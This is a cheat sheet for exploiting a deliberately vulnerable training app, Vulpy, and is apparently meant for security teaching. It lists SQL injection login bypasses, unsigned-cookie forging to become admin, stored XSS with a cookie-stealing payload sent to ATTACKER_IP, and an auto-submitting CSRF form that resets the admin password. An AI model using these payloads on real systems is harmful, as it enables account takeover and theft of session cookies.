# Vulpy Exploitation Cheat Sheet (Bad Version)

This cheat sheet guides you through exploiting the intentional vulnerabilities in the "Bad" version of Vulpy (Port 5002).

## 1. SQL Injection (Authentication Bypass)
**Vulnerability**: Insecure string formatting in `libuser.py` allows manipulating SQL queries.
**Location**: login form (`/user/login`).

- **Bypass Login as Admin**:
    - **Username**: `admin' --`
    - **Password**: `anything`
    - **Result**: Logs you in as `admin`.

- **Bypass Login (Alternative)**:
    - **Username**: `' OR 1=1 --`
    - **Password**: `anything`

- **Extracting Data (UNION Based)**:
    - **Username**: `' UNION SELECT 1, sql, 3, 4, 5, 6 FROM sqlite_master --`
    - **Password**: `anything`

## 2. Session Impersonation (Cookie Tampering)
**Vulnerability**: The session cookie `vulpy_session` is a Base64 encoded JSON object without any signature.
**Location**: `libsession.py`.

- **Steps**:
    1.  Decode your current cookie: `echo "YOUR_COOKIE" | base64 -d` -> `{"username": "elliot"}`.
    2.  Modify the JSON: `{"username": "admin"}`.
    3.  Encode back to Base64: `echo -n '{"username": "admin"}' | base64`.
    4.  Replace your browser cookie `vulpy_session` with this new value.
    5.  Refresh the page. You are now `admin`.

## 3. Cross-Site Scripting (XSS)
**Vulnerability**: User input is rendered with the `| safe` filter in Jinja2 templates, disabling auto-escaping.
**Locations**:
- **Posts**: `/posts`
- **Messages**: Flash messages after actions.

- **Stored XSS (Post)**:
    - Create a post with text: `<script>alert('XSS')</script>`
    - Anyone viewing the feed will execute the script.

- **Stealing Cookies via XSS**:
    - Post text: `<script>fetch('http://ATTACKER_IP/?cookie='+document.cookie)</script>`

## 4. Cross-Site Request Forgery (CSRF)
**Vulnerability**: Forms do not use CSRF tokens.
**Location**: Changing password (`/user/chpasswd`), Creating posts (`/api/post`).

- **Exploit (Change Admin Password)**:
    Host this HTML on an attacker server and lure the admin to visit it:
    ```html
    <form action="http://localhost:5002/user/chpasswd" method="POST">
      <input type="hidden" name="current_password" value="anything" /> <!-- Logic flaw might allow this -->
      <input type="hidden" name="new_password" value="hacked" />
      <input type="hidden" name="new_password_again" value="hacked" />
      <input type="submit" value="Click me" />
    </form>
    <script>document.forms[0].submit();</script>
    ```

## 5. Insecure Deserialization (Pickle)
*(Note: If applicable, verify if `pickle` is used. If not, this might refer to the JSON session tampering described above, which is technically "Insecure Deserialization" of untrusted data leading to privilege escalation).*

## 6. Authentication Bruteforce
**Vulnerability**: No rate limiting or lockout mechanism.
- **Tool**: Use `hydra` or a simple Python script to bruteforce the login form.

## 7. Sensitive Data Exposure
**Vulnerability**: Bad configuration or code comments.
- **Check**: `bad-passwords.txt`, `leaked_passwords.txt` in the source code.
- **CSP**: `csp.txt` might be weak or missing.
